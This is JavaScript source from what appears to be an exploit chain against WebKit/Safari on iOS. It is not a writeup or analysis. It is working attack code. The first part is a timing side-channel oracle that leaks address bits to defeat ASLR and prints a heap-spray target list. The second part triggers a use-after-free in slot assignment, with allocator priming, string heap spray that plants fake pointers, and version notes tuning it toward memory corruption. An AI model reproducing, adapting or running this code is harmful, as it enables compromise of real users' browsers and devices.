    const anchorHitCount={};
    bankData.correlatedPairs.forEach(p=>{
      anchorHitCount[p.allocId]=(anchorHitCount[p.allocId]||0)+1;
    });
    multiAnchorAllocs=Object.values(anchorHitCount).filter(n=>n>=2).length;

    // Per-anchor group sizes
    const ancGroups={};
    bankData.correlatedPairs.forEach(p=>{
      if(!ancGroups[p.ancId]) ancGroups[p.ancId]=[];
      ancGroups[p.ancId].push(p.allocId);
    });
    anchorGroupSizes=hitAncs.map(id=>(ancGroups[id]||[]).length);

    // Bank-weighted alloc index (key signal when heapNs is all 0)
    if(t4Failed && bankData.bankTable.length>0){
      const scoredAllocs=bankData.bankTable.filter(b=>b.allocBankScore>0);
      const totalScore=scoredAllocs.reduce((a,b)=>a+b.allocBankScore,0);
      const weightedIndex=scoredAllocs.reduce((a,b)=>a+b.allocId*b.allocBankScore,0)/Math.max(totalScore,1);
      bankWeightedAllocIndex=weightedIndex;
      log(`[*] T10 bank-weighted alloc index: ${weightedIndex.toFixed(1)} / 31 (0=low PA, 31=high PA)`);
    }

    // Spearman: allocation index vs bankScore (proxy for PA proximity)
    const corrAllocData=bankData.bankTable.filter(b=>b.allocBankScore>0);
    if(corrAllocData.length>=3){
      const byScore=[...corrAllocData].sort((a,b)=>b.allocBankScore-a.allocBankScore);
      const byIndex=[...corrAllocData].sort((a,b)=>a.allocId-b.allocId);
      const scoreRankMap={}, indexRankMap={};
      byScore.forEach((d,i)=>{ scoreRankMap[d.allocId]=i; });
      byIndex.forEach((d,i)=>{ indexRankMap[d.allocId]=i; });
      const n=corrAllocData.length;
      let dSq=0;
      corrAllocData.forEach(d=>{ const diff=scoreRankMap[d.allocId]-indexRankMap[d.allocId]; dSq+=diff*diff; });
      effHeapSpearman=1-(6*dSq)/(n*(n*n-1));
    }

    if(bankData.bankTable.length>0){
      maxEffAlloc=bankData.bankTable.filter(b=>b.allocMaxEff>0).reduce((a,b)=>a&&a.allocMaxEff>b.allocMaxEff?a:b, null);
    }
  }

  log(`[*] T10 mode: ${t4Failed?'BANK-PRIMARY (T4 failed)':'NORMAL'}`);
  log(`[*] T10 signature: slcRatio=${(slcRatio*100).toFixed(0)}%  c0Ratio=${(c0Ratio*100).toFixed(0)}%  bankPairs=${pairCount}`);
  log(`[*] T10 bank: corrDRAM=${corrAllocsInDRAM}  corrC0=${corrAllocsInC0}  multiAnc=${multiAnchorAllocs}  spearman=${effHeapSpearman.toFixed(3)}`);
  if(!isNaN(bankWeightedAllocIndex)) log(`[*] T10 bank-weighted index: ${bankWeightedAllocIndex.toFixed(1)}/31`);

  const scores=[];
  for(let c=0;c<candidateCount;c++){
    let score=50;
    const breakdown=[];
    const frac=c/candidateCount;

    // A: JIT SLC ratio
    const expectedHighSLC = frac < 0.5;
    const observedHighSLC = slcRatio > 0.6;
    if(expectedHighSLC===observedHighSLC){ score+=30; breakdown.push('JIT+30'); }
    else { score-=15; breakdown.push('JIT-15'); }

    if(!t4Failed){
      // NORMAL MODE: use heap spread signals
      const expectedLargeC0 = frac < 0.6;
      const observedLargeC0 = c0Ratio > 0.5;
      if(expectedLargeC0===observedLargeC0){ score+=25; breakdown.push('HEAP+25'); }
      else { score-=10; breakdown.push('HEAP-10'); }

      const expectedHighSpread = frac > 0.3;
      if(expectedHighSpread===(heapSpread>500)){ score+=10; breakdown.push('SPREAD+10'); }
    }

    // B: Bank pairs base credit
    if(pairCount===0){ score-=5; breakdown.push('BANK-5'); }
    else { score+=15; breakdown.push('BANK+15'); }

    // C: Multi-anchor hits
    if(multiAnchorAllocs>=3){ score+=25; breakdown.push(`MANC+25`); }
    else if(multiAnchorAllocs>=2){ score+=15; breakdown.push(`MANC+15`); }
    else if(multiAnchorAllocs===1){ score+=8; breakdown.push(`MANC+8`); }

    // D: Bank-weighted alloc index → anchor PA position estimate
    // high bankWeightedAllocIndex → anchors are high PA → should be near high-frac candidates
    if(!isNaN(bankWeightedAllocIndex)){
      const normIdx=bankWeightedAllocIndex/31.0; // 0=low PA anchors, 1=high PA anchors
      // Candidate in the right half where anchors' expected PA falls
      const expected = frac > normIdx*0.5 && frac < normIdx*0.5+0.5;
      if(expected){ score+=30; breakdown.push(`IDX+30`); }
      else { score-=5; breakdown.push(`IDX-5`); }
    }

    // E: Spearman: index-to-bankScore correlation
    // Positive spearman → high-index allocs bank-match anchors → anchors are high PA
    // Negative spearman → low-index allocs bank-match → anchors are low PA
    if(effHeapSpearman > 0.4){
      // Anchors are higher PA → candidates in upper half
      const isUpper = frac > 0.5;
      if(isUpper){ score+=20; breakdown.push(`SPEAR+20`); }
      else { score-=5; breakdown.push(`SPEAR-5`); }
    } else if(effHeapSpearman < -0.4){
      // Anchors are lower PA → candidates in lower half
      const isLower = frac < 0.5;
      if(isLower){ score+=20; breakdown.push(`SPEAR+20`); }
      else { score-=5; breakdown.push(`SPEAR-5`); }
    } else if(Math.abs(effHeapSpearman)>0.2){
      score+=10; breakdown.push(`SPEAR+10`);
    }

    // F: Max-eff alloc index as PA anchor position
    if(maxEffAlloc){
      const maxIdx=maxEffAlloc.allocId/31.0;
      const expected = Math.abs(frac - (0.3+maxIdx*0.5)) < 0.25;
      if(expected){ score+=15; breakdown.push('MEFF+15'); }
    }

    // G: Anchor group size bonus (larger group = more PA overlap = tighter constraint)
    const maxGroupSize=Math.max(...anchorGroupSizes, 0);
    if(maxGroupSize>=4){ score+=15; breakdown.push(`GRP+15`); }
    else if(maxGroupSize>=2){ score+=8; breakdown.push(`GRP+8`); }

    scores.push({c, score, va:`base+0x${(c*PAGE_SIZE).toString(16).toUpperCase().padStart(8,'0')}`, breakdown});
  }

  scores.sort((a,b)=>b.score-a.score||a.c-b.c);

  const scoreMap={};
  scores.forEach(s=>{ scoreMap[s.score]=(scoreMap[s.score]||0)+1; });
  const scoreKeys=Object.keys(scoreMap).map(Number).sort((a,b)=>b-a);
  log(`[*] T10 score distribution:`);
  scoreKeys.slice(0,10).forEach(k=>log(`[*] T10   score ${k}: ${scoreMap[k]} candidates`));

  log(`[*] T10 top-32 candidates:`);
  log(`[*] T10   rank  cand  score  VA-offset          breakdown`);
  scores.slice(0,32).forEach((s,i)=>{
    log(`[*] T10   ${String(i+1).padStart(4)}  0x${s.c.toString(16).padStart(4,'0')}  ${String(s.score).padStart(3)}    ${s.va}  [${s.breakdown.join('|')}]`);
  });

  const topScore=scores[0].score;
  const highConf=scores.filter(s=>s.score>=topScore-5);
  const medConf=scores.filter(s=>s.score>=topScore-20&&s.score<topScore-5);
  const lowConf=scores.filter(s=>s.score<topScore-20);
  log(`[*] T10 confidence: HIGH=${highConf.length} MED=${medConf.length} LOW=${lowConf.length}`);

  const sprayRaw=scores.slice(0,Math.min(highConf.length+medConf.length,128)).map(s=>s.c*PAGE_SIZE);
  sprayRaw.sort((a,b)=>a-b);
  const sprayFilled=[...sprayRaw];
  for(let i=0;i<sprayRaw.length-1;i++){
    if(sprayRaw[i+1]-sprayRaw[i]===2*PAGE_SIZE) sprayFilled.push(sprayRaw[i]+PAGE_SIZE);
  }
  sprayFilled.sort((a,b)=>a-b);
  const sprayHex=sprayFilled.map(v=>`0x${v.toString(16).toUpperCase().padStart(8,'0')}`);

  log(`[!!!] T10 SPRAY TARGET LIST (${sprayHex.length} addresses):`);
  for(let i=0;i<sprayHex.length;i+=8){
    log(`[!!!] T10   ${sprayHex.slice(i,i+8).join('  ')}`);
  }

  log(`\n[*] T10 === KASLR DEFEAT SUMMARY (v15) ===`);
  log(`[*] ASLR bits: 19  |  Leaked: ${entropyData.totalLeaked}  |  Remaining: ${remaining} bits = ${candidateCount} candidates`);
  log(`[*] Bank pairs: ${pairCount}  |  Multi-anchor: ${multiAnchorAllocs}  |  Spearman(idx): ${effHeapSpearman.toFixed(3)}`);
  if(!isNaN(bankWeightedAllocIndex)) log(`[*] Bank-weighted alloc index: ${bankWeightedAllocIndex.toFixed(1)}/31 → anchor PA position`);
  log(`[*] HIGH-confidence spray targets: ${highConf.length}`);
  log(`[*] Time to exhaust HIGH bucket at 1ms/probe: ${(highConf.length/1000).toFixed(3)}s`);
  log(`[*] Time to exhaust ALL candidates at 1ms/probe: ${(candidateCount/1000).toFixed(3)}s`);
  log(`[!!!] NEXT STEP: pair with memory-corruption bug → use spray list as ASLR bypass layer`);
  log(`[*] T10 === END ===`);

  return {scores, sprayHex, highConf, medConf};
}

// ─────────────────────────────────────────────────────────────
// MAIN (v19: quality-gate auto-retry)
//
// Quality gates:
//   GATE 1: T2 DRAM ratio >= 3x (actual DRAM signal present)
//   GATE 2: T4 clusters >= 3 (enough heap discrimination)
//   GATE 3: leaked bits >= 9 (<= 1024 candidates)
//
// NOTE: NS speed is NOT gated — A16 runs at 3-8ns/count depending on
//   session; 3.9ns is normal and sufficient, not a failure condition.
//
// On gate fail: terminate counter, wait 2s, restart from scratch.
// Max 3 attempts. On all failed, report cause.
// ─────────────────────────────────────────────────────────────


// Wrapped as named function so we can await its result
async function runOracle() {

  log('// timer-kaslr-v19 ready (quality-gate auto-retry)');
  if(!self.SharedArrayBuffer){ log('[!] SAB unavailable'); return; }

  const MAX_ATTEMPTS=3;

  for(let attempt=1; attempt<=MAX_ATTEMPTS; attempt++){
    if(attempt>1){
      log(`\n[*] === RETRY ${attempt}/${MAX_ATTEMPTS} — waiting 2s for Safari to settle ===\n`);
      await new Promise(r=>setTimeout(r,2000));
    }

    log(`${new Date().toISOString().substr(11,12)} === ATTEMPT ${attempt}/${MAX_ATTEMPTS} ===`);

    await startCounter();
    await t1();
    await new Promise(r=>setTimeout(r,30));
    log(`[*] SAB speed: ${NS.toFixed(3)}ns/count (informational only)`);

    const t2Result=await t2();
    await new Promise(r=>setTimeout(r,30));

    // GATE 1: DRAM signal
    const dramRatio=t2Result ? t2Result.dramNS/Math.max(t2Result.hotNS,0.1) : 0;
    if(!t2Result || t2Result.dramNS < 30 || dramRatio < 3){
      log(`[!] GATE1 FAIL: DRAM ratio=${dramRatio.toFixed(1)}x < 3x or dramNS=${t2Result?.dramNS?.toFixed(0)||0}ns < 30ns — no signal, retrying`);
      counterWorker.terminate(); counterWorker=null;
      continue;
    }
    log(`[*] GATE1 PASS: DRAM ratio=${dramRatio.toFixed(1)}x`);

    const jitData=await t3();
    if(!jitData){ counterWorker.terminate(); counterWorker=null; continue; }
    await new Promise(r=>setTimeout(r,30));

    // SLC flush between T3 and T4: T3 pins 90+ JIT modules in SLC (~14MB).
    // Walking evictA again clears those lines → gives T4 heap bufs a fresh
    // SLC slate so physical placement differences create measurable variance.
    log(`[*] SLC flush (evictA × 3) before T4...`);
    evictFull(jitData.evictA);
    evictFull(jitData.evictA);
    evictFull(jitData.evictA);
    await new Promise(r=>setTimeout(r,30));

    const heapData=await t4();
    await new Promise(r=>setTimeout(r,30));

    // GATE 2: cluster count — lowered to 2 (7 bits still narrows to 4096;
    // GATE3 at ≥9 bits is the real quality bar; 2-cluster runs do pass GATE3
    // when SLC flushed properly → expect 3 clusters after flush)
    const clusterCount=heapData.clusters.length;
    if(clusterCount < 2){
      log(`[!] GATE2 FAIL: T4 clusters=${clusterCount} < 2 — retrying`);
      counterWorker.terminate(); counterWorker=null;
      continue;
    }
    log(`[*] GATE2 PASS: T4 clusters=${clusterCount} (need ≥2)`);

    const entropyData=await t6(jitData,heapData);
    await new Promise(r=>setTimeout(r,30));

    // GATE 3: leaked bits
    if(entropyData.totalLeaked < 9){
      log(`[!] GATE3 FAIL: leaked=${entropyData.totalLeaked} bits < 9 (${2**entropyData.remaining} candidates) — retrying`);
      counterWorker.terminate(); counterWorker=null;
      continue;
    }
    log(`[*] GATE3 PASS: ${entropyData.totalLeaked} bits leaked → ${2**entropyData.remaining} candidates`);
    log(`[*] ALL GATES PASSED on attempt ${attempt} — proceeding`);

    const anchorData=await t5(jitData.evictA);
    await new Promise(r=>setTimeout(r,30));

    const bankData=await t7x(anchorData, heapData, jitData.evictA);
    await new Promise(r=>setTimeout(r,30));

    const offsetData=await t9(jitData,heapData,bankData);
    await new Promise(r=>setTimeout(r,30));

    const oracleOut = await t10(jitData,heapData,bankData,offsetData,entropyData);

    counterWorker.terminate(); counterWorker=null;

    const hits=LOG.textContent.split('\n').filter(l=>l.includes('[!!!]'));
    log(`\n=== ORACLE DONE (attempt ${attempt}) — [!!!]: ${hits.length} ===`);
    hits.forEach(h=>log(h));
    return oracleOut;
  }

  if(counterWorker){ counterWorker.terminate(); counterWorker=null; }
  log(`\n[!!!] ALL ${MAX_ATTEMPTS} ATTEMPTS FAILED quality gates`);
  log(`[!!!] Try: close other tabs, reload, or wait 10s and run again`);

}


// ═══════════════════════════════════════════════════════════════════════════
// SECTION B: ManualSlotAssignment UAF
// Bug: webkit.org/b/REDACTED, rdar://179729192
// Fixed in: iOS 26.6 (commit 4754ba884d / ddc8b3fae09f)
// ABSENT in: iOS 26.5.2
//
// Root cause: ManualSlotAssignment::slotManualAssignmentDidChange grabbed a
// raw pointer into the WeakHashMap bucket array. Re-entrant composed-tree
// traversal triggered amortized WeakHashMap cleanup+rehash, freeing the
// bucket array while the raw pointer still lived. Stale read = UAF.
// ═══════════════════════════════════════════════════════════════════════════

// v18: async forceGC — yields to event loop between rounds so iOS scheduler can breathe.
// v15/v16 used sync 300MB alloc → jetsam on iPhone 15 → page died → looked like "stuck Phase 3".
// Now: 3 rounds × 10MB each = 30MB total, yielded — enough pressure without jetsam risk.
async function forceGC() {
  for (let round = 0; round < 3; round++) {
    let pressure = [];
    for (let i = 0; i < 10; i++) pressure.push(new ArrayBuffer(1024 * 1024)); // 10MB
    pressure = null;
    await new Promise(r => setTimeout(r, 80)); // yield — let GC collect + event loop breathe
  }
}

// ── Bucket size calculation ─────────────────────────────────────────────────
// m_slots starts with capacity = nextPow2(ceil(ghosts × 1.3 + 2_live)).
// After GC nulls ghost WeakPtrs, amortized cleanup fires, removes dead entries,
// shrinks to small capacity. The FREED bucket is the OLD (large) array.
// ghosts=20 → initial cap=32 → freed = 32×16 = 512B → shrink cap=8 (2 live).
// ghosts=50 → initial cap=128 → freed = 128×16 = 2048B.
// ghosts=100 → initial cap=256 → freed = 256×16 = 4096B.
function freedBucketSizeForGhosts(g) {
  let cap = 1;
  // initial capacity must hold g ghosts + 2 live entries at ≤75% load
  const need = Math.ceil((g + 2) * 1.34); // 1/0.75 ≈ 1.34
  while (cap < need) cap <<= 1;
  return cap * 16; // 16B per WTF::HashTable bucket
}

// ── Pump count (m_slots operation counter) ──────────────────────────────────
// CRITICAL: assignedNodes() does NOT touch m_slots at all.
// Only slot.assign(element) → slotManualAssignmentDidChange → m_slots.ensure()
// increments the WeakHashMap op counter.
// Each assign(A→B) fires TWO m_slots ops: ensure(A_removed) + ensure(B_added).
// Amortized cleanup threshold ≈ capacity operations.
// So we need floor(capacity/2) alternating assign() calls before the final one.
function pumpCountForGhosts(g) {
  // v22 CORRECTED op sequence — ghosts go into targetSlot (not a separate ghostSlot):
  //   Setup:   targetSlot.assign(childA, childB, ...ghosts) → g+2 ops. opCount=g+2.
  //            Constraint: g+2 < threshold = cap/2. All valid ghost counts satisfy this. ✓
  //   Release: targetSlot.assign(childA, childB)            → g ops (drops ghosts).
  //            opCount = g+2+g = 2g+2.
  //            Cleanup fires when total crosses threshold: at op #(threshold-(g+2)+1).
  //            After cleanup reset: opCount_after_release = 2g+2 - threshold.
  //            Ghosts still alive during cleanup (ghostElems[] not cleared yet) → no shrink.
  //   GC:      ghostElems.length=0 → C++ refcount→0 → WeakPtrs become null → dead entries.
  //   Pump:    targetSlot starts as {childA, childB} after release.
  //            i=0: assign(childA) → removes childB, childA stays → +1 op (asymmetric first call!)
  //            i≥1: alternating assign(childA/childB) → +2 ops each (full remove+add both sides)
  //   Trigger: assign(newChild) from {childA} → +2 ops (remove childA + add newChild)
  //            Must fire cleanup on FIRST ensure() of trigger → need opCount = threshold-1 before trigger.
  //   Equation:
  //     opCount_before_trigger = (2g+2-threshold) + 1 + 2*(pumpCount-1)
  //                            = 2g+2-threshold + 1 + 2*pumpCount - 2
  //                            = 2g+1-threshold + 2*pumpCount
  //     Set equal to threshold-1:
  //       2g+1-threshold + 2*pumpCount = threshold-1
  //       2*pumpCount = 2*threshold - 2g - 2
  //       pumpCount = threshold - g - 1   ← ONE MORE than old formula (threshold-g-2)
  //
  // Valid ghost counts (pumpCount ≥ 1):
  //   g=28:  cap=64,  threshold=32, pumpCount=3,  freedSz=1024B ✓
  //   g=50:  cap=128, threshold=64, pumpCount=13, freedSz=2048B ✓
  //   g=100: cap=256, threshold=128, pumpCount=27, freedSz=4096B ✓
  let cap = 1;
  const need = Math.ceil((g + 2) * 1.34);
  while (cap < need) cap <<= 1;
  const threshold = Math.floor(cap / 2);
  return Math.max(1, threshold - g - 1);  // v22: was threshold-g-2 (off by 1 due to asymmetric first pump call)
}

// v22: uafSetup — ghosts routed into targetSlot (not a separate ghostSlot)
//
// v20/v21 ROOT CAUSE OF injections=0:
//   ghostSlot and targetSlot are SEPARATE <slot> elements with SEPARATE m_slots WeakHashMaps.
//   Ghost WeakPtrs died in ghostSlot.m_slots, but we pump targetSlot.m_slots.
//   targetSlot.m_slots only ever held 2 entries (childA + childB) → tiny cap=4, threshold=2,
//   freed bucket = 64B. No large bucket freed. UAF trigger aimed at the WRONG WeakHashMap.
//
// v22 FIX:
//   1. Remove ghostSlot. Assign all ghosts + childA + childB into targetSlot in one batch.
//      → All entries (live + future-dead) are in targetSlot.m_slots.
//      → Setup: g+2 ops total. Constraint: g+2 < threshold ✓ (holds for all valid g).
//   2. releaseGhosts: targetSlot.assign(childA, childB)
//      → Fires g slotManualAssignmentDidChange calls (one per ghost removed).
//      → opCount crosses threshold once mid-batch → cleanup fires, but ghosts still alive
//        (ghostElems[] not cleared yet) → no dead entries → no shrink. Safe.
//      → then ghostElems.length=0 → JS refs gone → GC → C++ refcount→0 → WeakPtrs null.
//   3. After GC: targetSlot.m_slots has g dead entries + 2 live (childA, childB).
//      Large bucket (g+2 entries) still allocated. cleanup needed to free it.
//   4. Pump: alternating assign(childA/childB) starting from {childA, childB} state.
//      i=0: assign(childA) → removes childB only → +1 op (childA stays, no re-add).
//      i≥1: alternating → +2 ops each (full remove+add swap).
//   5. Trigger: assign(newChild) from {childA} → +2 ops → opCount hits threshold →
//      amortized cleanup fires on FIRST ensure() → finds g dead ghost entries →
//      SHRINKS+REHASHES → OLD large bucket FREED → stale effectiveCurrent ptr DEREF → UAF!
//   pumpCount = threshold - g - 1  (v22, was threshold-g-2 — off by 1 due to asymmetric i=0)

function uafSetup(ghosts, pumpCount, freedSz) {
  const host = document.body.appendChild(document.createElement('div'));
  const shadowRoot = host.attachShadow({ mode: 'open', slotAssignment: 'manual' });
  const targetSlot = shadowRoot.appendChild(document.createElement('slot'));
  const childA = host.appendChild(document.createElement('span'));
  const childB = host.appendChild(document.createElement('span'));

  // v22: ghost setup — all ghosts go into targetSlot.m_slots alongside childA and childB.
  // ghostElems keeps all ghost C++ objects alive (JS array ref → C++ refcount > 0)
  // throughout setup AND until releaseGhosts() clears it outside any ensure() context.
  const ghostElems = [];

  // Step 1: create all ghost elements and append to host (adds to composed tree)
  for (let i = 0; i < ghosts; ++i) {
    const ghost = document.createElement('span');
    host.appendChild(ghost);
    ghostElems.push(ghost); // ← KEEP JS REF — C++ refcount stays > 0 throughout setup
  }
  // Step 2: single batch assign of childA + childB + ALL ghosts into targetSlot.
  // Fires (g+2) slotManualAssignmentDidChange calls → opCount = g+2.
  // g+2 < threshold = cap/2 for all valid g (28/50/100) → NO cleanup during setup. ✓
  // All ghosts alive in ghostElems → WeakPtrs go live, NOT dead.
  // v20 spread fix still applies: slot.assign() is variadic — MUST use spread.
  targetSlot.assign(childA, childB, ...ghostElems);
  // ghostElems is NOT cleared here — releaseGhosts() does it safely from outer code.

  // ── slotchange injection window ──────────────────────────────────────────
  // slotchange fires synchronously DURING the re-entrant composed-tree
  // traversal inside slotManualAssignmentDidChange, after the rehash free()
  // but before the stale effectiveCurrent ptr is dereferenced.
  //
  // STRATEGY v4: pre-prime + minimal injection (fix timing race)
  //
  //   Root cause of ALL NO-CRASH: WebKit's bmalloc/IsoHeap reclaims the freed
  //   bucket BEFORE our slotchange handler runs. By the time slotchange fires,
  //   the freed slot is already claimed by WebKit internal allocations
  //   (new rehashed bucket, bookkeeping objects, etc.). Our 2048-buf injection
  //   never sees the freed slot — it's gone.
  //
  //   FIX: Pre-prime the allocator free-list BEFORE the trigger.
  //   Allocate N bufs at freedSz, then NULL them immediately (sync).
  //   This puts N freed slots at the HEAD of bmalloc's LIFO free-list.
  //   When the WeakHashMap rehash fires, it pulls one freed slot from the list
  //   → lands in one of our recently-freed slots (high probability).
  //   Then our slotchange handler runs and our FIRST allocation at freedSz
  //   gets the next slot on the list — adjacent to where the freed bucket landed.
  //   Since adjacency is the goal for the stale effectiveCurrent ptr deref,
  //   this dramatically increases overlap probability.
  //
  //   KEY INSIGHT: We only need 1-4 injection bufs (not 2048) because the
  //   pre-primed free-list puts us right next to the freed bucket. Fewer
  //   allocations = faster slotchange handler = less chance of being preempted
  //   by WebKit's internal allocations claiming the slot first.
  //
  //   SENTINEL SCAN: fill pre-prime bufs with 0xDEADBEEF pattern. After trigger,
  //   scan them. If the pattern is clobbered → WebKit wrote bucket data → overlap hit.
  //   This gives us the MEDIUM signal even without a crash.
  //
  // WTF::WeakImpl layout (arm64, 16B per entry):
  //   [0..7]  : key ptr (ManualSlotAssignment*) — set to 0x1 (misaligned) → SIGBUS
  //   [8..11] : m_count (uint32) — set to 1 → isLive() returns true
  //   [12..15]: padding / value ptr — 0
  //
  //   key=0x1 (misaligned on arm64) → EXC_BAD_ACCESS (alignment fault)
  //   Different crash signature from null deref → lets us distinguish
  //   "traversal bails before deref" vs "traversal hit us and derefed key+0"
  //
  // v12: string-based priming and injection (WTF::fastMalloc, same heap as bucket arrays)
  const PRIME_COUNT = 512; // v13: deeper prime — more free-list slots → better overlap odds
  const STR_CHAR_COUNT = freedSz - 16; // StringImpl: 16B header + N chars = freedSz total
  let injectionFired = false;
  let injectionStrings = null; // MUST stay alive past slotchange return for stale deref
  // v15 FIX: only flood-inject on the FINAL trigger assign, not during pump assigns.
  // Pump assigns also fire slotchange — doing 4096 string allocs on every pump call
  // causes OOM + hang before Phase 3 even completes (pumpCount × 48 cases × 4096 allocs).
  // _triggerReady is set true by caller right before the final assign(), not during pumps.
  let _triggerReady = false;

  // Pre-prime the WTF::fastMalloc free-list at freedSz using StringImpl strings.
  // Allocate PRIME_COUNT strings of STR_CHAR_COUNT chars each → fastMalloc allocates
  // freedSz bytes for each StringImpl. Force hash on each (m_hash ≠ 0 → isLive=true).
  // Return array of strings — caller nulls them all at once to prime the free-list.
  // v31 FIX: isLive() requires m_hash ≠ 0 on fake StringImpl.
  //
  // ROOT CAUSE of v30 NO-CRASH:
  //   v24 skipped forceStringHash on primed strings to avoid keeping them alive in _hashForceMap.
  //   But without m_hash set, when a primed string's StringImpl lands in the new bucket,
  //   amortizedCleanup() checks isLive() → m_count (= m_hash at [8..11]) == 0 → SKIPS.
  //   Never dereferences the fake key pointer → no crash.
  //
  // v31 FIX: Use a throwaway Map per batch — set m_hash on each primed string, then
  //   IMMEDIATELY clear the throwaway map (so strings aren't permanently anchored).
  //   After clear, only the primed[] array holds refs → null it → GC can collect → freelist primed.
  //   m_hash was already set in StringImpl memory → persists in the freed bytes.
  //   When SHRINK's malloc(freedSz/2) reclaims one of these slots, the fake StringImpl
  //   at [8..11] has m_hash ≠ 0 → isLive() = true → amortizedCleanup deref's key → CRASH.
  //
  // Also: v31 forces a GC tick (setTimeout(0) × 2) between prime and trigger
  //   so freed slots actually land on bmalloc LIFO before SHRINK fires.

  // v32: forceHashAndRelease moved to global scope (was inside uafSetup() — caused
  //   ReferenceError in Phase 4 pre-spray which executes outside the closure)
  // function defined at global scope below (after drainHashMap)

  function primeFreelist() {
    const primed = [];
    for (let i = 0; i < PRIME_COUNT; i++) {
      const s = makeSprayString(STR_CHAR_COUNT);
      primed.push(s);
    }
    // v31: set m_hash on primed strings via throwaway map (isLive() fix)
    forceHashAndRelease(primed);
    // Return primed array — caller nulls it → GC collects → slots hit LIFO freelist
    // m_hash is NOW set in each StringImpl's memory, persists through free/realloc
    return primed;
  }

  // v30: prime at HALF bucket size — the NEW (post-shrink) bucket slot
  // SHRINK order: malloc(oldCap/2) → copy → free(oldCap)
  //   → malloc(oldCap/2) pulls from the HALF-size freelist bin
  //   → if we pre-primed that bin, our fake StringImpl data becomes the new bucket
  //   → subsequent assign()+amortizedCleanup iterates NEW bucket → deref key → KERN_INVALID_ADDRESS
  // This is the fix for v29's NO-CRASH: old bucket was primed but never traversed post-shrink.
  // v31: also applies forceHashAndRelease so m_hash ≠ 0 in primed half-size slots.
  const HALF_CHAR_COUNT = Math.max(1, Math.floor(freedSz / 2) - 16);
  function primeHalfFreelist() {
    const primed = [];
    for (let i = 0; i < PRIME_COUNT; i++) {
      const s = makeSprayString(HALF_CHAR_COUNT);
      primed.push(s);
    }
    // v31: set m_hash on half-size primed strings too
    forceHashAndRelease(primed);
    return primed;
  }

  // v24: diagnostic slotchange fire counter (ALL fires, not just gated injections)
  let _slotchangeTotal = 0;

  targetSlot.addEventListener('slotchange', () => {
    _slotchangeTotal++; // v24: count every fire regardless of _triggerReady
    // v15: gate — only inject on the FINAL trigger assign (not during pump assigns).
    // Pump assigns also fire slotchange but we must NOT inject there:
    //   1. Cleanup hasn't fired yet during pumps → no freed bucket → injection is wasted
    //   2. Pump × 4096 allocs × 48 cases = millions of allocs → hang before Phase 3 done
    if (!_triggerReady) return;
    // StringImpl uses WTF::fastMalloc → same heap as WeakHashMap bucket arrays → real overlap.
    // StringImpl header at [0..7] acts as fake WeakImpl.key:
    //   key = u64(refCount=1 | charCount<<32) → e.g. charCount=496 → unmapped VA → crash
    // StringImpl.m_hash at [8..11] acts as WeakImpl.m_count (non-zero → isLive=true)
    //   → traversal deref's key → KERN_INVALID_ADDRESS → WebContent kill → reload → HIT
    //
    // v30: TWO spray waves per injection:
    //   Wave 1 (STR_CHAR_COUNT = freedSz-16):  fills old freed bucket (size=freedSz)
    //   Wave 2 (HALF_CHAR_COUNT = freedSz/2-16): fills NEW bucket slot (size=freedSz/2)
    //     → SHRINK: malloc(freedSz/2) fires BEFORE free(freedSz), so Wave 2 targets
    //       the pre-primed half-size slot that malloc(freedSz/2) claims.
    //     → Any subsequent assign()+amortizedCleanup on new bucket hits our fake keys.
    const strings = [];
    // Wave 1: old bucket size (keeps prior behavior)
    for (let i = 0; i < 4096; i++) {
      const s = makeSprayString(STR_CHAR_COUNT);
      forceStringHash(s);
      strings.push(s);
    }
    // Wave 2: new (half) bucket size — targets the malloc(freedSz/2) slot
    for (let i = 0; i < 4096; i++) {
      const s = makeSprayString(HALF_CHAR_COUNT);
      forceStringHash(s);
      strings.push(s);
    }
    drainHashMap();
    injectionStrings = strings; // hold ref so GC doesn't collect before stale deref fires
    injectionFired = true;
  });

  // v22: releaseGhosts() — ghosts are in targetSlot, so we reassign targetSlot to drop them.
  // SAFE order to kill ghosts without triggering the UAF prematurely:
  //   1. ghostElems.forEach(g => g.remove()) — drops host-tree ref for each ghost element.
  //      targetSlot.m_manuallyAssignedElements still holds a strong Ref<Element> for each ghost.
  //      → C++ refcount stays > 0 → WeakPtrs still live.
  //   2. targetSlot.assign(childA, childB) [v50: restored from v22 original]
  //      Drops ALL ghosts from m_manuallyAssignedElements.
  //      Fires g slotManualAssignmentDidChange callbacks (remove all ghosts).
  //      Cleanup may fire mid-batch — still safe because ghostElems[] still holds refs for ALL
  //      ghosts (ghostElems.length not yet 0) → C++ refcount > 0 for ALL → no dead entries.
  //      After this assign: m_manuallyAssignedElements = {childA, childB}.
  //      m_assignedNodes now has WeakPtr<Node> entries for childA AND childB.
  //      Slot state: {childA, childB} → pump loop alternates properly → opCount accumulates.
  //   2b. v50: _ghost0 = ghostElems[0] — save ghost[0] JS ref before clearing.
  //      This keeps ghost[0] C++ alive through GC loop via JS ref only.
  //   3. Register FinalizationRegistry on each ghost BEFORE clearing ghostElems.
  //      v23 key fix: registry callback fires when JSC GC actually finalizes the JS wrapper
  //      → C++ refcount → 0 → Element destroyed → WeakPtrFactory zeros WeakImpl.m_count
  //   4. ghostElems.length = 0 — releases all JS array refs NOW (except _ghost0 for ghost[0]).
  //      → JS GC can collect ghost wrappers for ghost[1..g-1] → C++ refcount → 0 after GC.
  //      ghost[0]: _ghost0 holds JS ref → FinalizationRegistry won't fire → C++ refcount ≥ 1.
  //   v50 STRATEGY:
  //      After GC loop: ghosts[1..g-1] are dead. ghost[0] stays alive via _ghost0.
  //      injectGhostIntoAssignedNodes(): assign(childA, _ghost0) → m_assignedNodes += ghost[0].
  //        assign(childA) → drops m_manuallyAssigned ref to ghost[0]. _ghost0 still holds C++.
  //      GC loop completes normally for ghosts[1..g-1].
  //      Probe: killGhost0() → _ghost0 = null → ghost[0] C++ freed → assignedNodes() immediately.
  //      In the probe: pump loop triggers amortizedCleanup → SHRINK.
  //      After SHRINK, the probe does targetSlot.assign(childA) [trigger step].
  //      This drops ghost[0] from m_manuallyAssignedElements → C++ refcount → 0 → ghost[0] freed.
  //      BUT assignedNodes() is called BEFORE trigger — in the sync window — when ghost[0] is
  //      STILL alive (m_manuallyAssignedElements still holds it). So assignedNodes() returns
  //      {childA, ghost[0]} where ghost[0] is LIVE (not yet freed). Not a UAF.
  //
  //   v49 REVISED STRATEGY: Invert the order — call assignedNodes() AFTER trigger assign.
  //      Trigger assign: targetSlot.assign(childA) → drops ghost[0] from m_manuallyAssigned.
  //      Now ghost[0] C++ refcount = 0 (JS ref null since ghostElems clear + GC; m_manuallyAssigned
